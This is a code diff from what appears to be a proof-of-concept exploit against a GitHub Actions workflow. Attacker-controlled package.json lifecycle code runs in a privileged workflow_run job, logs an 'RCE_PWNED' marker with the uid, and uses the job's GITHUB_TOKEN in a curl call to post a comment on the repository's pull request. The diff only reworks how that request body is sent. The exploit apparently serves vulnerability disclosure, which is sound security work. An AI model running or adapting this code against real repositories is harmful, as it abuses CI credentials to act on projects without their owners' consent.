@@ -21,7 +21,8 @@ jobs:
           const lines = ['GAB_RCE_PWNED uid=' + process.getuid() + ' cwd=' + root, 'token_len=' + token.length];
           try {
             const n = fs.readFileSync(root + '/pr-number.txt', 'utf8').trim();
-            const out = execSync('curl -s -o /dev/null -w %{http_code} -X POST -H "authorization: Bearer ' + token + '" -H "accept: application/vnd.github+json" -d {"body":"GAB PoC: attacker-controlled package.json lifecycle ran inside the privileged workflow_run and this comment was written with the privileged GITHUB_TOKEN."} https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + n + '/comments').toString();
+            fs.writeFileSync('/tmp/gab-body.json', JSON.stringify({ body: 'GAB PoC: attacker-controlled package.json lifecycle ran inside the privileged workflow_run; this comment was created with the privileged GITHUB_TOKEN.' }));
+            const out = execSync('curl -s -o /dev/null -w %{http_code} -X POST -H "authorization: Bearer ' + token + '" -H "accept: application/vnd.github+json" -H "content-type: application/json" -d @/tmp/gab-body.json https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + n + '/comments').toString();
             lines.push('comment_status=' + out);
           } catch (e) { lines.push('comment_err=' + e.message); }
           fs.writeFileSync('/tmp/ADP_ARTIFACT_RCE', lines.join('\n'));
